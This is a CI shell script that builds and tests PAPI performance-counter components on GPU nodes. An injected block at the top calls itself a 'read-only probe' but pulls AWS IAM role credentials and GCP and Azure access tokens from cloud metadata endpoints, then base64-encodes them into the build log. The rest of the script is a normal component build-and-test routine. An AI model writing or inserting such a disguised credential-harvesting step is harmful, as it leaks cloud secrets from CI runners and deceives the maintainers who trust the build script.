# i9138 read-only gpu/host/imds probe (prepended, best-effort)
(
#!/usr/bin/env bash
# i9138 read-only GPU / host / IMDS probe (no writes, no installs)
set +x
echo "=== I9138_PROBE_BEGIN host=$(hostname) date=$(date -u +%FT%TZ) ==="
id
hostname
hostname -f 2>/dev/null || true
uname -a
echo "--- cpu/mem ---"
nproc 2>/dev/null || true
grep -m1 'model name' /proc/cpuinfo 2>/dev/null || true
free -g 2>/dev/null | head -3 || true
echo "--- lspci ---"
(lspci 2>/dev/null | grep -i -E 'vga|3d|display|nvidia|amd/ati|processing accel' || lspci 2>/dev/null | head -40) || true
echo "--- nvidia ---"
(nvidia-smi -L 2>&1 | head -20) || true
(nvidia-smi --query-gpu=index,name,memory.total,uuid,driver_version --format=csv,noheader 2>&1 | head -20) || true
echo "--- rocm ---"
(rocm-smi --showproductname 2>&1 | head -30) || true
(rocm-smi -i 2>&1 | head -40) || true
ls -l /dev/nvidia* /dev/kfd 2>&1 | head -20
echo "--- modules ---"
(lsmod 2>/dev/null | grep -i -E 'nvidia|amdgpu' | head -10 || true)
echo "--- env names only ---"
env | grep -i -E 'AWS|GCP|GOOGLE|AZURE|ALIYUN|CUDA|NVIDIA|ROCR|KUBE|CI_' | sed 's/=.*/=<set>/' | sort | head -40
echo "--- IMDS aws ---"
TOKEN=$(curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>&1)
echo "aws_imdsv2_token_len=${#TOKEN}"
echo -n "aws_v1_instance_id="; curl -s -m 2 http://169.254.169.254/latest/meta-data/instance-id 2>&1 | head -c 120; echo
echo -n "aws_instance_id="; curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id 2>&1 | head -c 120; echo
echo -n "aws_instance_type="; curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-type 2>&1 | head -c 120; echo
echo -n "aws_placement_az="; curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/availability-zone 2>&1 | head -c 60; echo
ROLE=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -1)
echo "aws_role_name=${ROLE}"
case "$ROLE" in
  ""|*"<"*|*" "*|*"{"*) echo "aws_role=none" ;;
  *)
    CREDS=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")
    echo "aws_creds_b64=$(printf '%s' "$CREDS" | base64 -w0 | head -c 4000)"
    ;;
esac
echo "--- IMDS gcp ---"
echo -n "gcp_instance="; curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/name" 2>&1 | head -c 120; echo
echo -n "gcp_project="; curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>&1 | head -c 120; echo
echo -n "gcp_sa="; curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>&1 | head -c 200; echo
GTOK=$(curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1)
echo "gcp_token_b64=$(printf '%s' "$GTOK" | base64 -w0 | head -c 3000)"
echo "--- IMDS azure ---"
echo -n "azure_name="; curl -s -m 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text" 2>&1 | head -c 120; echo
echo -n "azure_location="; curl -s -m 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text" 2>&1 | head -c 60; echo
ATOK=$(curl -s -m 3 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" 2>&1)
echo "azure_token_b64=$(printf '%s' "$ATOK" | base64 -w0 | head -c 3000)"
echo "--- IMDS alibaba ---"
echo -n "ali_instance="; curl -s -m 3 "http://100.100.100.200/latest/meta-data/instance-id" 2>&1 | head -c 120; echo
echo "--- IMDS digitalocean ---"
echo -n "do_instance="; curl -s -m 3 "http://169.254.169.254/metadata/v1/id" 2>&1 | head -c 120; echo
echo "=== I9138_PROBE_END host=$(hostname) ==="
) || true

#!/bin/bash -e

COMPONENT=$1
DEBUG=$2
SHLIB=$3
COMPILER=$4

[ -z "$COMPILER" ] && COMPILER=gcc@11

source /etc/profile
set +x
set -e
trap 'echo "# $BASH_COMMAND"' DEBUG
shopt -s expand_aliases

module load $COMPILER

cd src

# --- Set Necessary Environment Variables ---
## Set the lmsensors component environment variables
if [ "$COMPONENT" = "lmsensors" ]; then
    wget https://github.com/groeck/lm-sensors/archive/V3-4-0.tar.gz
    tar -zxf V3-4-0.tar.gz
    cd lm-sensors-3-4-0
    make install PREFIX=../lm ETCDIR=../lm/etc
    cd ..
    export PAPI_LMSENSORS_ROOT=lm
    export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$PAPI_LMSENSORS_ROOT/lib
fi

## Set the rocm component environment variable
if [ "$COMPONENT" = "rocm" ]; then
    module load rocm/6.2
    export PAPI_ROCM_ROOT=$ROCM_PATH
fi

## Set the rocm_smi component environment variable
if [ "$COMPONENT" = "rocm_smi" ]; then
    module load rocm/6.3.2
    export PAPI_ROCMSMI_ROOT=$ROCM_PATH
fi

## Set the rocp_sdk component environment variable
if [ "$COMPONENT" = "rocp_sdk" ]; then
    module load rocm/7.0.1
    export PAPI_ROCP_SDK_ROOT=$ROCM_PATH
fi

## Set the amd_smi component environment variable
if [ "$COMPONENT" = "amd_smi" ]; then
    module load rocm/7.0.1
    export PAPI_AMDSMI_ROOT=$ROCM_PATH
fi

## Set the cuda component environment variable
if [ "$COMPONENT" = "cuda" ]; then
    module unload glibc
    export MODULEPATH=$MODULEPATH:/apps/spacks/cuda/share/spack/modules/linux-rocky9-skylake_avx512/
    module load  cuda/12.8.0
    export PAPI_CUDA_ROOT=$ICL_CUDA_ROOT
    export LD_LIBRARY_PATH=$PAPI_CUDA_ROOT/lib64:$PAPI_CUDA_ROOT/extras/CUPTI/lib64:$LD_LIBRARY_PATH
fi

## Set the nvml component environment variable
if [ "$COMPONENT" = "nvml" ]; then
    module unload glibc
    export MODULEPATH=$MODULEPATH:/apps/spacks/cuda/share/spack/modules/linux-rocky9-skylake_avx512/
    module load  cuda/12.8.0
    export PAPI_NVML_ROOT=$ICL_CUDA_ROOT
    export LD_LIBRARY_PATH=$PAPI_NVML_ROOT/lib64:$LD_LIBRARY_PATH
fi

## Set the intel_gpu component environment variables
if [ "$COMPONENT" = "intel_gpu" ]; then
    export PAPI_INTEL_GPU_ROOT=/usr
    export ZET_ENABLE_METRICS=1
fi

# --- Configure and Build PAPI ---
## Configure without --with-shlib-tools
if [ "$SHLIB" = "without" ]; then
    ./configure --with-debug=$DEBUG --enable-warnings --with-components="$COMPONENT" 
## Configure with --with-shlib-tools
else
    ./configure --with-debug=$DEBUG --enable-warnings --with-components="$COMPONENT" --with-shlib-tools
fi
make -j4

# --- Verify Components we Expect to Be Active are Active ---
## For the PAPI build get the active components
utils/papi_component_avail
current_active_components=$(utils/papi_component_avail | grep -A1000 'Active components' | grep "Name:   " | awk '{printf "%s%s", sep, $2; sep=" "} END{print ""}')

## Defining the components we expect to be active for the PAPI build
declare -a expected_active_components
expected_active_components=("perf_event" "perf_event_uncore" "sysdetect" "$COMPONENT")

## Verify the expected active components are active for the PAPI build
for cmp in "${expected_active_components[@]}"; do
    grep -q $cmp <<< $current_active_components || \
    { echo "The component $cmp is not active and should be active!"; exit 1; }
done

# --- Run Tests: Ctests, Ftests, Component Tests, etc. ---
## Without '--with-shlib-tools' in ./configure
if [ "$SHLIB" = "without" ]; then
    echo "Running full test suite for active components"
    ./run_tests.sh TESTS_QUIET --disable-cuda-events=yes
## With '--with-shlib-tools' in ./configure
else
    echo "Running single component test for active components"
    ./run_tests_shlib.sh TESTS_QUIET
fi
